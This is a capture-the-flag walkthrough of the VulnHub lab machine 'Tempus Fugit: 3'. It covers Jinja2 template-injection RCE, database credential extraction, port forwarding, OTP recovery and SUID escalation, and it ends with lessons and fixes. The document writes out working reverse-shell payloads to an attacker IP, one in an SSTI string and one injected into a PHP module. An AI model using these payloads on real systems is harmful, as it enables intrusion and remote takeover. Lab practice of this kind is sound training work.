# Tempus Fugit: 3 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.10.X (host-only) |
| **Difficulty** | Hard |
| **OS** | Linux |
| **Flags** | 4 flags across SSTI, SQLite DB, user home, and root |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/tempus-fugit-3,672/) |

## Attack Summary

SSTI (Jinja2) → RCE → `app.py` base64 secret (Flag 1) → sqlcipher DB dump (Flag 2) → SSH port forward → module upload RCE → QR code → SSH (myrtia) → addcustomer UID 1337 → SSH private key (cecil) → SUID `ping` UID check "deadbeef" → root (Flag 4)

## Methodology

1. Network discovery and web enumeration
2. SSTI identification and RCE via Jinja2
3. SQLite credential extraction with sqlcipher
4. Internal port forwarding and second web service
5. Module upload for foothold
6. Multi-stage privilege escalation: myrtia → 1337 user → cecil → root

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.10.0/24
# Add to /etc/hosts: <IP>  tempusf3.vh
nmap -A -p- tempusf3.vh
```

---

## Step 2: SSTI — Jinja2 RCE

The app reflects URL input. Test for SSTI:

```
http://tempusf3.vh/path/{{7*7}}
# Returns 49 → Jinja2 confirmed (not Twig, which returns 49 too, but the __class__ chain differs)
```

Confirm RCE:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# uid=33(www-data)
```

Reverse shell (attacker on 192.168.10.167:4444):

```
{{''.__class__.__mro__[1].__subclasses__()[373]("bash -c 'bash -i >& /dev/tcp/192.168.10.167/4444 0>&1'",shell=True,stdout=-1).communicate()[0].strip()}}
```

```bash
nc -lvnp 4444
```

---

## Step 3: Flag 1 — app.py Secret

From the shell:

```bash
cat app.py
# Contains a base64-encoded SECRET_KEY and a pragma key for the SQLite DB
echo "<base64_value>" | base64 -d
# FLAG 1
```

---

## Step 4: Flag 2 — SQLite DB with sqlcipher

The `pragma key` from `app.py` unlocks the encrypted DB:

```bash
sqlcipher customers.db
PRAGMA key = '<pragma_key>';
.tables
SELECT * FROM users;
# Three users + FLAG 2 (base64 encoded values)
```

Both user profiles reference port **37303**.

---

## Step 5: Internal Port Forward

Run an internal port scan:

```python
import socket
for port in [22,80,443,37303,8080]:
    s = socket.socket()
    if s.connect_ex(('127.0.0.1', port)) == 0:
        print(port, 'open')
    s.close()
```

SSH port-forward from attacker:

```bash
ssh -L 37303:127.0.0.1:37303 www-data@tempusf3.vh -i id_rsa
ssh -p 37303 <user>@127.0.0.1

ssh -L 8443:127.0.0.1:443 www-data@tempusf3.vh -i id_rsa
# Browse https://127.0.0.1:8443 → names "Hugh Janus" as admin
```

---

## Step 6: Module Upload → Shell

Log in to the second web service as `admin` (Hugh's password from DB).

Download the hello-world module, edit `Helloworld.module.php` to add a reverse shell in the `else` branch:

```php
} else {
    system("bash -c 'bash -i >& /dev/tcp/192.168.10.167/5555 0>&1'");
}
```

Upload the module. Activate it. Catch shell:

```bash
nc -lvnp 5555
# shell as www-data on inner service
```

---

## Step 7: Escalate to myrtia (QR Code + SSH OTP)

```bash
ls backups/
# image named after system user
# Decode the QR code with zbar or online tool
# → OTP seed for Google Authenticator (OUPAUTH)
oathtool --totp -b <seed>
ssh myrtia@127.0.0.1 -p 37303
# Enter OTP when prompted
cat ~/flag3.txt
# FLAG 3
sudo -l
# can run /opt/addcustomer as root
```

---

## Step 8: UID 1337 → Cecil (SSH Key)

```bash
sudo /opt/addcustomer
# Follow prompts; create user with UID 1337
# Login as that user
# Find suspicious file owned by UID 1337 → contains OpenSSH private key
ssh -i id_1337 cecil@127.0.0.1 -p 37303
```

---

## Step 9: Root via SUID ping

Reverse-engineer `/usr/bin/ping` — it opens a shell when UID matches string "deadbeef":

```bash
# As UID matching "deadbeef" user
/usr/bin/ping deadbeef
id
# uid=0(root)
cat /root/flag4.txt
# FLAG 4
```

---

## Lessons Learned

1. **Jinja2 SSTI** — never allow user input to be rendered as a template; use `{{ variable }}` with strict context, never eval
2. **Encrypted SQLite** — pragma keys in source code defeat encryption at rest
3. **QR code in backup** — embedded secrets in images are security-relevant artifacts
4. **SUID with UID checks** — custom SUID binaries with hardcoded UID comparisons are logic vulnerabilities
5. **OTP as sole barrier** — TOTP is effective only if the seed is not recoverable from the filesystem

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| SSTI in Jinja2 | Use `render_template` with context vars, never eval user input |
| SQLite pragma key in source | Use environment variables, never hardcode crypto keys |
| Module upload without validation | Restrict upload types, sign modules, sandbox execution |
| SUID binary with UID logic | Remove SUID, use proper privilege separation |
| OTP seed stored in image | Protect backup files, restrict access to backup directories |
